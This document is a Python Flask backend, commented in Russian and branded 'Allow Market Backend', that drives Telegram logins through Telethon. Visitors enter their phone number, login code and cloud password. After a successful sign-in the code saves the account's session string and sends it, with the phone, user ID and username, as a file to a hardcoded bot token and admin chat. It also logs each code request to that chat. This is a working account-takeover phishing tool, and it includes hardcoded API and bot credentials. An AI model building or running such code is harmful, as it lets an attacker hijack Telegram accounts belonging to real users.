# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ С TELETHON
# Ошибка asyncio event loop — исправлена!

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')

sessions = {}

# ============================================================
# СОЗДАЁМ ОДИН EVENT LOOP ДЛЯ ВСЕГО ПРИЛОЖЕНИЯ
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
# ФУНКЦИИ ДЛЯ ЛОГОВ
# ============================================================

def send_admin_log(message, data=None):
    try:
        text = f"🔐 {message}"
        if data:
            text += f"\n{data}"
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Admin log error: {e}")

def send_tdata_to_admin(session_data):
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ TELEGRAM")
        lines.append("=" * 50)
        lines.append(f"🆔 User ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append(f"📛 Name: {session_data.get('first_name', 'N/A')}")
        lines.append("")
        lines.append("🔑 SESSION STRING:")
        lines.append(session_data.get('session_string', 'N/A'))
        lines.append("")
        lines.append("📋 JSON:")
        lines.append(json.dumps(session_data, indent=2, ensure_ascii=False))
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ *НОВАЯ СЕССИЯ*\n👤 @{session_data['username']}\n📱 {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Send tdata error: {e}")

# ============================================================
# MTProto ФУНКЦИИ (Telethon) — ИСПОЛЬЗУЮТ ОДИН EVENT LOOP
# ============================================================

async def send_code_async(phone):
    try:
        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
        client = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        result = await client.send_code_request(phone)
        
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        send_admin_log(f"📱 Запрос кода для {phone}")
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
            
        except SessionPasswordNeededError:
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            return {'success': True, 'sessionData': session_data}
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# ОБЁРТКА ДЛЯ ЗАПУСКА АСИНХРОННЫХ ФУНКЦИЙ
# ============================================================

def run_async(coro):
    """Запуск корутины в существующем event loop"""
    return loop.run_until_complete(coro)

# ============================================================
# FLASK ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'service': 'Allow Market Backend (Telethon/MTProto)',
        'version': '8.0.0',
        'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
        'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_async(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            send_tdata_to_admin(session_data)
            send_admin_log(f"✅ Верификация успешна для {phone}")
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_password_async(phone, password))
    
    if result['success']:
        session_data = result['sessionData']
        send_tdata_to_admin(session_data)
        send_admin_log(f"🔑 Пароль подтверждён для {phone}")
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Verified'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
    print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
    print("📌 Используется один event loop для всех запросов")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000)
